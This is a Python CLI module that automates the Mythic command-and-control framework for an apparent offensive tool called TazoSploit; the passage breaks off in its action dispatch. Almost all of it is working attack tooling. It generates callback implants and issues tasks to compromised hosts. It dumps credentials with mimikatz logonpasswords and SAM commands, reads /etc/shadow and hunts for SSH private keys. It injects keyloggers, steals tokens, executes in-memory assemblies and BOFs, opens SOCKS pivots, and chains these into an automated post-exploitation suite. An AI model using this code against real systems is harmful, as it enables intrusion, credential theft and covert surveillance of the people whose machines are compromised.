#!/usr/bin/env python3
"""mythic_c2.py — Mythic C2 automation for TazoSploit.

Provides a CLI interface for all Mythic C2 operations via the GraphQL API:
payload generation, callback management, task execution, file browsing,
credential harvesting, SOCKS proxying, P2P linking, screenshots, keylogging,
token manipulation, .NET assembly execution, and BOF loading.

Usage:
    python3 mythic_c2.py --action status --json
    python3 mythic_c2.py --action create-payload --agent apollo --os windows --arch x64 --c2-profile http --json
    python3 mythic_c2.py --action list-callbacks --json
    python3 mythic_c2.py --action task --callback-id 1 --command shell --params "whoami" --json
    python3 mythic_c2.py --action post-exploit-all --callback-id 1 --output-dir /pentest/output --json

Environment:
    MYTHIC_URL          — Mythic server URL (default: https://mythic:7443)
    MYTHIC_API_KEY      — API key for authentication (required for most actions)
    MYTHIC_ADMIN_USER   — Admin username (fallback auth)
    MYTHIC_ADMIN_PASSWORD — Admin password (fallback auth)
    MYTHIC_SSL_VERIFY   — Verify SSL cert (default: false)
    MYTHIC_C2_CALLBACK_HOST — Host for agent callbacks (auto-detect if not set)
    MYTHIC_C2_CALLBACK_PORT — Port for agent callbacks (default: 443)
    MYTHIC_DEFAULT_AGENT — Default agent type (default: apollo)
"""

import argparse
import asyncio
import json
import logging
import os
import ssl
import sys
import time
import urllib.request
import urllib.error
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%SZ",
)
log = logging.getLogger("mythic_c2")

# ── Configuration ──────────────────────────────────────────────────────────────

MYTHIC_URL = os.getenv("MYTHIC_URL", "https://mythic:7443").rstrip("/")
MYTHIC_API_KEY = os.getenv("MYTHIC_API_KEY", "")
MYTHIC_ADMIN_USER = os.getenv("MYTHIC_ADMIN_USER", "mythic_admin")
MYTHIC_ADMIN_PASSWORD = os.getenv("MYTHIC_ADMIN_PASSWORD", "")
MYTHIC_SSL_VERIFY = os.getenv("MYTHIC_SSL_VERIFY", "false").lower() in ("true", "1", "yes")
MYTHIC_C2_CALLBACK_HOST = os.getenv("MYTHIC_C2_CALLBACK_HOST", "")
MYTHIC_C2_CALLBACK_PORT = os.getenv("MYTHIC_C2_CALLBACK_PORT", "443")
MYTHIC_DEFAULT_AGENT = os.getenv("MYTHIC_DEFAULT_AGENT", "apollo")
OUTPUT_DIR = os.getenv("OUTPUT_DIR", "/pentest/output")

# Agent → OS mapping
AGENT_OS_MAP = {
    "apollo": "Windows",
    "poseidon": "Linux",
    "medusa": "Python",
}

# C2 session artifact schema version
C2_SESSION_SCHEMA_VERSION = "1.0"


# ── SSL Context ────────────────────────────────────────────────────────────────

def _ssl_context() -> ssl.SSLContext:
    """Create SSL context, optionally disabling verification."""
    ctx = ssl.create_default_context()
    if not MYTHIC_SSL_VERIFY:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return ctx


# ── GraphQL Client (stdlib only — no external deps required) ───────────────────

class MythicGraphQLClient:
    """Minimal GraphQL client for Mythic using only urllib (stdlib).

    Falls back gracefully when the ``mythic`` PyPi package is not installed.
    """

    def __init__(self, url: str, api_key: str = "", username: str = "", password: str = ""):
        self.graphql_url = f"{url}/graphql/"
        self.api_key = api_key
        self.access_token = ""
        self.username = username
        self.password = password
        self._ssl_ctx = _ssl_context()

    # ── Authentication ─────────────────────────────────────────────────────

    def authenticate(self) -> bool:
        """Authenticate with Mythic and obtain an access token.

        Tries API key first, then falls back to username/password login.
        """
        if self.api_key:
            # API key doesn't need login — test with a simple query.
            try:
                result = self.query("{ operatorOperation { operator { username } } }")
                if result and "errors" not in result:
                    log.info("Authenticated via API key")
                    return True
            except Exception:
                pass

        # Fallback to user/pass login
        if self.username and self.password:
            login_url = f"{MYTHIC_URL}/auth"
            payload = json.dumps({
                "username": self.username,
                "password": self.password,
            }).encode("utf-8")

            req = urllib.request.Request(
                login_url,
                data=payload,
                headers={"Content-Type": "application/json"},
                method="POST",
            )
            try:
                with urllib.request.urlopen(req, context=self._ssl_ctx, timeout=30) as resp:
                    data = json.loads(resp.read().decode("utf-8"))
                    self.access_token = data.get("access_token", "")
                    if self.access_token:
                        log.info("Authenticated via username/password")
                        return True
            except Exception as e:
                log.error(f"Login failed: {e}")
                return False

        log.error("No authentication method available")
        return False

    # ── GraphQL query/mutation ─────────────────────────────────────────────

    def query(self, query_str: str, variables: Optional[Dict] = None) -> Dict:
        """Execute a GraphQL query or mutation."""
        payload = json.dumps({
            "query": query_str,
            "variables": variables or {},
        }).encode("utf-8")

        headers = {"Content-Type": "application/json"}
        if self.api_key:
            headers["apitoken"] = self.api_key
        elif self.access_token:
            headers["Authorization"] = f"Bearer {self.access_token}"

        req = urllib.request.Request(
            self.graphql_url,
            data=payload,
            headers=headers,
            method="POST",
        )

        try:
            with urllib.request.urlopen(req, context=self._ssl_ctx, timeout=60) as resp:
                return json.loads(resp.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace") if e.fp else ""
            log.error(f"GraphQL HTTP {e.code}: {body[:500]}")
            return {"errors": [{"message": f"HTTP {e.code}: {body[:200]}"}]}
        except Exception as e:
            log.error(f"GraphQL request failed: {e}")
            return {"errors": [{"message": str(e)}]}

    def mutation(self, mutation_str: str, variables: Optional[Dict] = None) -> Dict:
        """Execute a GraphQL mutation (alias for query)."""
        return self.query(mutation_str, variables)


# ── Mythic Operations ──────────────────────────────────────────────────────────

class MythicC2:
    """High-level Mythic C2 operations."""

    def __init__(self, client: MythicGraphQLClient, output_dir: str):
        self.client = client
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    # ── Server Status ──────────────────────────────────────────────────────

    def status(self) -> Dict:
        """Check Mythic server status and available agents."""
        result = self.client.query("""
            query {
                payloadtype { name id supported_os wrapper }
                c2profile { name id is_p2p running }
                operatorOperation { operator { username } }
            }
        """)

        if "errors" in result:
            return {"status": "error", "errors": result["errors"]}

        data = result.get("data", {})
        payload_types = data.get("payloadtype", [])
        c2_profiles = data.get("c2profile", [])

        return {
            "status": "online",
            "mythic_url": MYTHIC_URL,
            "payload_types": [
                {"name": pt["name"], "os": pt.get("supported_os", ""), "wrapper": pt.get("wrapper", False)}
                for pt in payload_types
            ],
            "c2_profiles": [
                {"name": cp["name"], "p2p": cp.get("is_p2p", False), "running": cp.get("running", False)}
                for cp in c2_profiles
            ],
            "agent_count": len(payload_types),
            "c2_profile_count": len(c2_profiles),
        }

    # ── Payload Creation ───────────────────────────────────────────────────

    def create_payload(
        self,
        agent: str = "apollo",
        target_os: str = "windows",
        arch: str = "x64",
        c2_profile: str = "http",
        commands: Optional[List[str]] = None,
        filename: Optional[str] = None,
        description: str = "",
    ) -> Dict:
        """Create a Mythic payload via GraphQL mutation.

        Uses the REST-style payload creation endpoint since the full
        createPayload mutation requires complex nested input types.
        """
        agent_lower = agent.lower()
        os_label = AGENT_OS_MAP.get(agent_lower, target_os.capitalize())

        if not filename:
            ext_map = {"apollo": ".exe", "poseidon": "", "medusa": ".py"}
            ext = ext_map.get(agent_lower, "")
            filename = f"payload_{agent_lower}{ext}"

        callback_host = MYTHIC_C2_CALLBACK_HOST
        if not callback_host:
            # Auto-detect: use the Mythic server host
            from urllib.parse import urlparse
            parsed = urlparse(MYTHIC_URL)
            callback_host = f"https://{parsed.hostname}:{MYTHIC_C2_CALLBACK_PORT}"

        # Use the Mythic REST API for payload creation (simpler than GraphQL mutation)
        create_url = f"{MYTHIC_URL}/api/v1.4/payloads/create"
        payload_def = {
            "payload_type": agent_lower,
            "selected_os": os_label,
            "c2_profiles": [
                {
                    "c2_profile": c2_profile,
                    "c2_profile_parameters": {
                        "callback_host": callback_host,
                        "callback_port": MYTHIC_C2_CALLBACK_PORT,
                        "callback_interval": "10",
                    },
                }
            ],
            "filename": filename,
            "description": description or f"TazoSploit {agent} payload",
            "build_parameters": [],
        }

        if commands:
            payload_def["commands"] = commands

        headers = {"Content-Type": "application/json"}
        if self.client.api_key:
            headers["apitoken"] = self.client.api_key
        elif self.client.access_token:
            headers["Authorization"] = f"Bearer {self.client.access_token}"

        req = urllib.request.Request(
            create_url,
            data=json.dumps(payload_def).encode("utf-8"),
            headers=headers,
            method="POST",
        )

        try:
            with urllib.request.urlopen(req, context=_ssl_context(), timeout=120) as resp:
                data = json.loads(resp.read().decode("utf-8"))

            if data.get("status") == "success" or data.get("uuid"):
                uuid = data.get("uuid", "")
                log.info(f"Payload created: agent={agent}, os={os_label}, uuid={uuid}")
                return {
                    "status": "success",
                    "uuid": uuid,
                    "agent": agent,
                    "os": os_label,
                    "c2_profile": c2_profile,
                    "filename": filename,
                }
            else:
                return {"status": "error", "error": data.get("error", str(data))}

        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace") if e.fp else ""
            # Fallback: try GraphQL mutation
            log.warning(f"REST payload creation failed (HTTP {e.code}), trying GraphQL...")
            return self._create_payload_graphql(
                agent_lower, os_label, c2_profile, callback_host, filename, commands, description
            )
        except Exception as e:
            return {"status": "error", "error": str(e)}

    def _create_payload_graphql(
        self, agent: str, os_label: str, c2_profile: str,
        callback_host: str, filename: str, commands: Optional[List[str]], description: str,
    ) -> Dict:
        """Fallback payload creation via GraphQL."""
        # Build the mutation — Mythic's createPayload mutation is complex,
        # so we use a simplified approach
        mutation = """
            mutation createPayloadMutation($input: String!) {
                createPayload(payloadDefinition: $input) {
                    uuid
                    status
                    error
                }
            }
        """
        payload_def = json.dumps({
            "payload_type": agent,
            "selected_os": os_label,
            "c2_profiles": [{
                "c2_profile": c2_profile,
                "c2_profile_parameters": {
                    "callback_host": callback_host,
                    "callback_port": MYTHIC_C2_CALLBACK_PORT,
                    "callback_interval": "10",
                },
            }],
            "filename": filename,
            "description": description or f"TazoSploit {agent} payload",
            "commands": commands or [],
            "build_parameters": [],
        })

        result = self.client.mutation(mutation, {"input": payload_def})
        data = result.get("data", {}).get("createPayload", {})

        if data.get("uuid"):
            log.info(f"Payload created via GraphQL: uuid={data['uuid']}")
            return {
                "status": "success",
                "uuid": data["uuid"],
                "agent": agent,
                "os": os_label,
                "c2_profile": c2_profile,
                "filename": filename,
            }
        return {"status": "error", "error": data.get("error", result.get("errors", "Unknown error"))}

    def download_payload(self, uuid: str, output_path: Optional[str] = None) -> Dict:
        """Download a built payload by UUID."""
        download_url = f"{MYTHIC_URL}/api/v1.4/payloads/download/{uuid}"

        headers = {}
        if self.client.api_key:
            headers["apitoken"] = self.client.api_key
        elif self.client.access_token:
            headers["Authorization"] = f"Bearer {self.client.access_token}"

        req = urllib.request.Request(download_url, headers=headers)

        try:
            with urllib.request.urlopen(req, context=_ssl_context(), timeout=120) as resp:
                content = resp.read()

            if not output_path:
                output_path = os.path.join(self.output_dir, f"payload_{uuid[:8]}")

            with open(output_path, "wb") as f:
                f.write(content)

            os.chmod(output_path, 0o755)
            log.info(f"Payload downloaded: {output_path} ({len(content)} bytes)")
            return {"status": "success", "path": output_path, "size_bytes": len(content)}
        except Exception as e:
            return {"status": "error", "error": str(e)}

    # ── Callback Management ────────────────────────────────────────────────

    def list_callbacks(self, active_only: bool = True) -> Dict:
        """List Mythic callbacks."""
        where_clause = "where: {active: {_eq: true}}" if active_only else ""
        result = self.client.query(f"""
            query {{
                callback({where_clause}, order_by: {{id: desc}}) {{
                    id
                    display_id
                    host
                    user
                    ip
                    os
                    architecture
                    pid
                    integrity_level
                    domain
                    active
                    last_checkin
                    init_callback
                    payload {{
                        payload_type {{ name }}
                        uuid
                    }}
                }}
            }}
        """)

        if "errors" in result:
            return {"status": "error", "errors": result["errors"]}

        callbacks = result.get("data", {}).get("callback", [])
        log.info(f"Found {len(callbacks)} callback(s)")

        return {
            "status": "success",
            "callbacks": callbacks,
            "count": len(callbacks),
        }

    def get_callback_info(self, callback_id: int) -> Dict:
        """Get detailed info about a specific callback."""
        result = self.client.query(f"""
            query {{
                callback(where: {{display_id: {{_eq: {callback_id}}}}}) {{
                    id
                    display_id
                    host
                    user
                    ip
                    os
                    architecture
                    pid
                    integrity_level
                    domain
                    active
                    last_checkin
                    init_callback
                    extra_info
                    process_name
                    sleep_info
                    payload {{
                        payload_type {{ name }}
                        uuid
                    }}
                    loadedcommands {{
                        command {{ cmd }}
                    }}
                }}
            }}
        """)

        if "errors" in result:
            return {"status": "error", "errors": result["errors"]}

        callbacks = result.get("data", {}).get("callback", [])
        if not callbacks:
            return {"status": "error", "error": f"Callback {callback_id} not found"}

        cb = callbacks[0]
        loaded_cmds = [lc["command"]["cmd"] for lc in cb.get("loadedcommands", []) if lc.get("command")]
        cb["loaded_commands"] = loaded_cmds

        return {"status": "success", "callback": cb}

    # ── Task Execution ─────────────────────────────────────────────────────

    def create_task(self, callback_id: int, command: str, params: str = "") -> Dict:
        """Issue a task (command) to a callback."""
        # Use REST API for task creation
        task_url = f"{MYTHIC_URL}/api/v1.4/tasks/callback/{callback_id}"

        task_data = {
            "command": command,
            "params": params,
        }

        headers = {"Content-Type": "application/json"}
        if self.client.api_key:
            headers["apitoken"] = self.client.api_key
        elif self.client.access_token:
            headers["Authorization"] = f"Bearer {self.client.access_token}"

        req = urllib.request.Request(
            task_url,
            data=json.dumps(task_data).encode("utf-8"),
            headers=headers,
            method="POST",
        )

        try:
            with urllib.request.urlopen(req, context=_ssl_context(), timeout=60) as resp:
                data = json.loads(resp.read().decode("utf-8"))

            if data.get("status") == "success" or data.get("id"):
                task_id = data.get("id", "")
                log.info(f"Task created: callback={callback_id}, cmd={command}, task_id={task_id}")
                return {"status": "success", "task_id": task_id, "command": command}
            else:
                return {"status": "error", "error": data.get("error", str(data))}
        except urllib.error.HTTPError:
            # Fallback to GraphQL
            return self._create_task_graphql(callback_id, command, params)
        except Exception as e:
            return {"status": "error", "error": str(e)}

    def _create_task_graphql(self, callback_id: int, command: str, params: str) -> Dict:
        """Fallback task creation via GraphQL."""
        result = self.client.mutation(f"""
            mutation {{
                createTask(
                    callback_display_id: {callback_id},
                    command: "{command}",
                    params: "{params.replace('"', '\\"')}"
                ) {{
                    id
                    status
                    error
                }}
            }}
        """)

        data = result.get("data", {}).get("createTask", {})
        if data.get("id"):
            return {"status": "success", "task_id": data["id"], "command": command}
        return {"status": "error", "error": data.get("error", result.get("errors", "Unknown"))}

    def get_task_output(self, task_id: int, timeout: int = 60) -> Dict:
        """Poll for task output until completion or timeout."""
        start = time.time()
        while time.time() - start < timeout:
            result = self.client.query(f"""
                query {{
                    task(where: {{id: {{_eq: {task_id}}}}}) {{
                        id
                        command_name
                        original_params
                        status
                        completed
                        responses(order_by: {{id: asc}}) {{
                            response
                        }}
                    }}
                }}
            """)

            if "errors" in result:
                return {"status": "error", "errors": result["errors"]}

            tasks = result.get("data", {}).get("task", [])
            if not tasks:
                return {"status": "error", "error": f"Task {task_id} not found"}

            task = tasks[0]
            if task.get("completed"):
                responses = [r.get("response", "") for r in task.get("responses", [])]
                output = "\n".join(responses)
                log.info(f"Task {task_id} completed: {len(output)} chars output")
                return {
                    "status": "success",
                    "task_id": task_id,
                    "command": task.get("command_name", ""),
                    "task_status": task.get("status", ""),
                    "output": output,
                    "completed": True,
                }

            time.sleep(2)

        return {
            "status": "timeout",
            "task_id": task_id,
            "error": f"Task did not complete within {timeout}s",
        }

    def task_and_wait(self, callback_id: int, command: str, params: str = "",
                      timeout: int = 60) -> Dict:
        """Create a task and wait for its output."""
        task_result = self.create_task(callback_id, command, params)
        if task_result.get("status") != "success":
            return task_result

        task_id = task_result["task_id"]
        return self.get_task_output(task_id, timeout=timeout)

    # ── File Browser ───────────────────────────────────────────────────────

    def file_browser(self, callback_id: int, path: str = "/") -> Dict:
        """Browse files on target via the callback."""
        return self.task_and_wait(callback_id, "ls", f"-Path {path}")

    # ── Credential Harvesting ──────────────────────────────────────────────

    def get_credentials(self) -> Dict:
        """Get all credentials stored in Mythic."""
        result = self.client.query("""
            query {
                credential {
                    id
                    type
                    realm
                    account
                    credential
                    comment
                    task { callback { host user } }
                }
            }
        """)

        if "errors" in result:
            return {"status": "error", "errors": result["errors"]}

        creds = result.get("data", {}).get("credential", [])
        log.info(f"Found {len(creds)} credential(s)")
        return {"status": "success", "credentials": creds, "count": len(creds)}

    def hashdump(self, callback_id: int) -> Dict:
        """Execute credential dumping commands based on agent type."""
        cb_info = self.get_callback_info(callback_id)
        if cb_info.get("status") != "success":
            return cb_info

        cb = cb_info["callback"]
        agent_type = cb.get("payload", {}).get("payload_type", {}).get("name", "").lower()
        target_os = (cb.get("os") or "").lower()

        results = {"action": "hashdump", "callback_id": callback_id}

        if agent_type == "apollo" or "windows" in target_os:
            # Try mimikatz first
            mimi_result = self.task_and_wait(
                callback_id, "mimikatz", "sekurlsa::logonpasswords", timeout=120
            )
            results["mimikatz"] = mimi_result

            # Also try hashdump if available
            hash_result = self.task_and_wait(
                callback_id, "mimikatz", "lsadump::sam", timeout=120
            )
            results["sam_dump"] = hash_result
        elif agent_type == "poseidon" or "linux" in target_os or "darwin" in target_os:
            # Try to read shadow file
            shadow_result = self.task_and_wait(callback_id, "cat", "/etc/shadow", timeout=30)
            results["shadow"] = shadow_result

            # SSH keys
            keys_result = self.task_and_wait(callback_id, "shell", "find /home -name id_rsa -o -name id_ed25519 2>/dev/null", timeout=30)
            results["ssh_keys"] = keys_result
        elif agent_type == "medusa":
            # Python-based credential extraction
            results["note"] = "Use eval_code for custom credential extraction"

        # Fetch all stored credentials from Mythic
        cred_result = self.get_credentials()
        results["stored_credentials"] = cred_result.get("credentials", [])
        results["status"] = "success"

        self._save_evidence("credentials.json", results)
        return results

    # ── SOCKS Proxy ────────────────────────────────────────────────────────

    def start_socks(self, callback_id: int, port: int = 1080) -> Dict:
        """Start SOCKS5 proxy through a callback."""
        return self.task_and_wait(callback_id, "socks", f"-Port {port}", timeout=30)

    def stop_socks(self, callback_id: int) -> Dict:
        """Stop SOCKS proxy."""
        return self.task_and_wait(callback_id, "socks", "stop", timeout=15)

    # ── Screenshot ─────────────────────────────────────────────────────────

    def screenshot(self, callback_id: int) -> Dict:
        """Capture a screenshot from the callback."""
        result = self.task_and_wait(callback_id, "screenshot", "", timeout=60)

        # Mythic stores screenshots separately — query them
        ss_result = self.client.query(f"""
            query {{
                task(where: {{
                    callback: {{display_id: {{_eq: {callback_id}}}}},
                    command_name: {{_eq: "screenshot"}}
                }}, order_by: {{id: desc}}, limit: 1) {{
                    id
                    responses {{
                        response
                    }}
                }}
            }}
        """)

        return {
            "status": "success" if result.get("completed") else result.get("status", "unknown"),
            "action": "screenshot",
            "callback_id": callback_id,
            "task_result": result,
        }

    # ── Keylogging ─────────────────────────────────────────────────────────

    def keylog(self, callback_id: int, target_pid: Optional[int] = None) -> Dict:
        """Start keylogger (Apollo: inject into process; Medusa: not supported)."""
        cb_info = self.get_callback_info(callback_id)
        if cb_info.get("status") != "success":
            return cb_info

        agent_type = cb_info["callback"].get("payload", {}).get("payload_type", {}).get("name", "").lower()

        if agent_type == "apollo":
            if target_pid:
                return self.task_and_wait(callback_id, "keylog_inject", f"-PID {target_pid}", timeout=30)
            else:
                return {"status": "error", "error": "Apollo keylog_inject requires --target-pid"}
        else:
            return {"status": "error", "error": f"Keylogging not supported for agent type: {agent_type}"}

    # ── Token Manipulation ─────────────────────────────────────────────────

    def steal_token(self, callback_id: int, pid: int) -> Dict:
        """Steal a process token (Apollo only)."""
        return self.task_and_wait(callback_id, "steal_token", str(pid), timeout=30)

    def make_token(self, callback_id: int, domain: str, user: str, password: str) -> Dict:
        """Create a token with credentials (Apollo only)."""
        params = json.dumps({"domain": domain, "user": user, "password": password})
        return self.task_and_wait(callback_id, "make_token", params, timeout=30)

    def rev2self(self, callback_id: int) -> Dict:
        """Revert to original token."""
        return self.task_and_wait(callback_id, "rev2self", "", timeout=15)

    # ── Assembly & BOF Execution ───────────────────────────────────────────

    def execute_assembly(self, callback_id: int, assembly: str, args: str = "") -> Dict:
        """Execute a .NET assembly in-memory (Apollo only)."""
        params = f"-Assembly {assembly}"
        if args:
            params += f" -Arguments {args}"
        return self.task_and_wait(callback_id, "execute_assembly", params, timeout=120)

    def execute_bof(self, callback_id: int, bof_file: str, function: str = "go",
                    args: str = "", timeout_sec: int = 30) -> Dict:
        """Execute a BOF/COFF object file (Apollo only)."""
        params = f"-Coff {bof_file} -Function {function} -Timeout {timeout_sec}"
        if args:
            params += f" -Arguments {args}"
        return self.task_and_wait(callback_id, "execute_coff", params, timeout=timeout_sec + 30)

    # ── P2P Linking ────────────────────────────────────────────────────────

    def link_agent(self, callback_id: int, host: str, c2_profile: str = "smb") -> Dict:
        """Link to a P2P agent (SMB or TCP)."""
        params = json.dumps({"host": host, "c2_profile": c2_profile})
        return self.task_and_wait(callback_id, "link", params, timeout=60)

    def unlink_agent(self, callback_id: int) -> Dict:
        """Unlink a P2P agent."""
        return self.task_and_wait(callback_id, "unlink", "", timeout=30)

    # ── Download/Upload ────────────────────────────────────────────────────

    def download_file(self, callback_id: int, remote_path: str) -> Dict:
        """Download a file from the target system."""
        result = self.task_and_wait(callback_id, "download", f"-Path {remote_path}", timeout=120)

        if result.get("status") == "success":
            # Save to evidence directory
            filename = os.path.basename(remote_path)
            local_path = os.path.join(self.output_dir, f"loot_{filename}")
            # Note: actual file content is stored in Mythic's file manager.
            # The task output confirms the download. Use Mythic UI or API to retrieve.
            result["note"] = f"File queued for download in Mythic. Retrieve via Mythic file manager."
            result["local_target"] = local_path

        return result

    # ── Full Post-Exploitation Suite ───────────────────────────────────────

    def post_exploit_all(self, callback_id: int) -> Dict:
        """Run comprehensive post-exploitation suite."""
        log.info(f"Running full post-exploitation suite on callback {callback_id}...")
        results = {"action": "post_exploit_all", "callback_id": callback_id}

        # 1. Get callback info
        cb_info = self.get_callback_info(callback_id)
        if cb_info.get("status") != "success":
            return {"status": "error", "error": f"Cannot access callback {callback_id}"}

        cb = cb_info["callback"]
        agent_type = cb.get("payload", {}).get("payload_type", {}).get("name", "").lower()
        target_os = (cb.get("os") or "").lower()
        results["callback_info"] = {
            "host": cb.get("host"),
            "user": cb.get("user"),
            "ip": cb.get("ip"),
            "os": cb.get("os"),
            "arch": cb.get("architecture"),
            "pid": cb.get("pid"),
            "integrity": cb.get("integrity_level"),
            "domain": cb.get("domain"),
            "agent": agent_type,
        }

        # 2. Enumeration
        log.info("Step 1/6: Enumeration...")
        enum_result = self.task_and_wait(callback_id, "shell", "whoami && id 2>/dev/null || whoami /all", timeout=30)
        results["enum"] = enum_result

        # 3. Process listing
        log.info("Step 2/6: Process listing...")
        ps_result = self.task_and_wait(callback_id, "ps", "", timeout=30)
        results["processes"] = ps_result

        # 4. Credential harvesting
        log.info("Step 3/6: Credential harvesting...")
        cred_result = self.hashdump(callback_id)
        results["credentials"] = cred_result

        # 5. Screenshot
        log.info("Step 4/6: Screenshot...")
        ss_result = self.screenshot(callback_id)
        results["screenshot"] = ss_result

        # 6. File browser (home directory / sensitive paths)
        log.info("Step 5/6: File browser...")
        if "windows" in target_os:
            fb_result = self.file_browser(callback_id, "C:\\Users")
        else:
            fb_result = self.file_browser(callback_id, "/home")
        results["file_browser"] = fb_result

        # 7. Privilege check
        log.info("Step 6/6: Privilege assessment...")
        if "windows" in target_os:
            priv_result = self.task_and_wait(callback_id, "shell", "whoami /priv", timeout=30)
        else:
            priv_result = self.task_and_wait(callback_id, "shell", "sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -20", timeout=30)
        results["privileges"] = priv_result

        # Summary
        successes = sum(1 for k, v in results.items()
                        if isinstance(v, dict) and v.get("status") == "success" or v.get("completed"))
        errors = sum(1 for k, v in results.items()
                     if isinstance(v, dict) and v.get("status") == "error")
        results["summary"] = {
            "total_actions": 6,
            "successes": successes,
            "errors": errors,
            "completed_at": datetime.now(timezone.utc).isoformat(),
        }

        # Write c2_session.json
        session_artifact = {
            "schema_version": C2_SESSION_SCHEMA_VERSION,
            "framework": "mythic",
            "sessions": [{
                "session_id": str(cb.get("display_id", cb.get("id", ""))),
                "type": "callback",
                "target_ip": cb.get("ip", ""),
                "target_os": cb.get("os", "unknown"),
                "target_arch": cb.get("architecture", "unknown"),
                "username": cb.get("user", "unknown"),
                "hostname": cb.get("host", "unknown"),
                "transport": "http",
                "agent_type": agent_type,
                "established_at": cb.get("init_callback", datetime.now(timezone.utc).isoformat()),
            }],
        }
        self._save_evidence("c2_session.json", session_artifact)
        self._save_evidence("post_exploit_summary.json", results["summary"])
        self._save_evidence("evidence.json", results)

        log.info(f"Post-exploitation complete: {successes} successes, {errors} errors")
        return results

    # ── Cleanup ────────────────────────────────────────────────────────────

    def cleanup(self, kill_callbacks: bool = True) -> Dict:
        """Clean up Mythic artifacts (callbacks, payloads) after engagement."""
        results = {"action": "cleanup"}

        if kill_callbacks:
            cb_result = self.list_callbacks(active_only=True)
            killed = 0
            for cb in cb_result.get("callbacks", []):
                cb_id = cb.get("display_id", cb.get("id"))
                try:
                    self.create_task(cb_id, "exit", "")
                    killed += 1
                except Exception as e:
                    log.warning(f"Failed to kill callback {cb_id}: {e}")
            results["callbacks_killed"] = killed

        results["status"] = "success"
        results["completed_at"] = datetime.now(timezone.utc).isoformat()
        self._save_evidence("c2_cleanup.json", results)
        return results

    # ── Evidence Helpers ───────────────────────────────────────────────────

    def _save_evidence(self, filename: str, data: Any):
        """Save evidence to the output directory."""
        path = os.path.join(self.output_dir, filename)
        try:
            with open(path, "w") as f:
                json.dump(data, f, indent=2, default=str)
            log.debug(f"Evidence saved: {path}")
        except Exception as e:
            log.warning(f"Failed to save evidence {path}: {e}")


# ── CLI Interface ──────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Mythic C2 automation for TazoSploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Actions:
  status              Check Mythic server status and available agents
  create-payload      Generate a payload (Apollo/Poseidon/Medusa)
  download-payload    Download a built payload by UUID
  list-callbacks      List active Mythic callbacks
  callback-info       Get detailed callback information
  task                Issue a command to a callback
  task-output         Get output of a task by ID
  file-browser        Browse files on target
  screenshot          Capture target screenshot
  keylog              Start keylogger (Apollo only)
  hashdump            Dump credentials from target
  start-socks         Start SOCKS5 proxy
  stop-socks          Stop SOCKS5 proxy
  execute-assembly    Execute .NET assembly in-memory (Apollo)
  execute-bof         Execute BOF/COFF object file (Apollo)
  link                Link to a P2P agent
  download            Download file from target
  steal-token         Steal process token (Apollo)
  make-token          Create token with credentials (Apollo)
  rev2self            Revert to original token
  post-exploit-all    Run full post-exploitation suite
  cleanup             Kill all callbacks and clean up
""",
    )

    parser.add_argument("--action", required=True,
                        help="Action to perform (see list above)")
    parser.add_argument("--json", action="store_true",
                        help="Output as JSON")
    parser.add_argument("--output-dir", default=OUTPUT_DIR,
                        help=f"Evidence output directory (default: {OUTPUT_DIR})")

    # Payload creation
    parser.add_argument("--agent", default=MYTHIC_DEFAULT_AGENT,
                        choices=["apollo", "poseidon", "medusa"],
                        help="Agent type for payload creation")
    parser.add_argument("--os", default="windows", dest="target_os",
                        help="Target OS (windows, linux, python)")
    parser.add_argument("--arch", default="x64",
                        help="Target architecture (x64, x86, amd64, arm64)")
    parser.add_argument("--c2-profile", default="http",
                        help="C2 profile (http, smb, tcp)")
    parser.add_argument("--commands", nargs="*",
                        help="Commands to include in payload")
    parser.add_argument("--filename", default=None,
                        help="Output filename for payload")
    parser.add_argument("--payload-uuid", default=None,
                        help="Payload UUID (for download-payload)")

    # Callback & task
    parser.add_argument("--callback-id", type=int, default=None,
                        help="Callback display ID")
    parser.add_argument("--command", default=None,
                        help="Command to execute on callback")
    parser.add_argument("--params", default="",
                        help="Parameters for the command")
    parser.add_argument("--task-id", type=int, default=None,
                        help="Task ID (for task-output)")
    parser.add_argument("--timeout", type=int, default=60,
                        help="Timeout in seconds for task output polling")

    # File operations
    parser.add_argument("--path", default="/",
                        help="Path for file browser / download")
    parser.add_argument("--remote-path", default=None,
                        help="Remote file path for download")

    # Screenshot / keylog
    parser.add_argument("--target-pid", type=int, default=None,
                        help="Target PID for keylog injection")

    # SOCKS
    parser.add_argument("--port", type=int, default=1080,
                        help="Port for SOCKS proxy")

    # Assembly / BOF
    parser.add_argument("--assembly", default=None,
                        help=".NET assembly filename (registered via register_file)")
    parser.add_argument("--assembly-args", default="",
                        help="Arguments for .NET assembly")
    parser.add_argument("--bof-file", default=None,
                        help="BOF/COFF object file")
    parser.add_argument("--bof-function", default="go",
                        help="BOF entry function name")

    # P2P linking
    parser.add_argument("--link-host", default=None,
                        help="Host to link P2P agent")
    parser.add_argument("--link-c2", default="smb",
                        help="C2 profile for P2P link (smb, tcp)")

    # Token manipulation
    parser.add_argument("--token-domain", default=None,
                        help="Domain for make_token")
    parser.add_argument("--token-user", default=None,
                        help="Username for make_token")
    parser.add_argument("--token-password", default=None,
                        help="Password for make_token")

    return parser


def main():
    parser = build_parser()
    args = parser.parse_args()

    # Initialize client
    client = MythicGraphQLClient(
        url=MYTHIC_URL,
        api_key=MYTHIC_API_KEY,
        username=MYTHIC_ADMIN_USER,
        password=MYTHIC_ADMIN_PASSWORD,
    )

    mythic = MythicC2(client, args.output_dir)
    action = args.action.lower().replace("_", "-")

    # Actions that don't need auth
    if action == "status":
        if not client.authenticate():
            result = {
                "status": "unreachable",
                "mythic_url": MYTHIC_URL,
                "error": "Cannot authenticate to Mythic server",
            }
        else:
            result = mythic.status()
    else:
        # Authenticate
        if not client.authenticate():
            result = {"status": "error", "error": "Authentication failed"}
            if args.json:
                print(json.dumps(result, indent=2, default=str))
            else:
                print(f"[-] Error: {result['error']}", file=sys.stderr)
            sys.exit(1)

        # Dispatch actions
        if action == "create-payload":
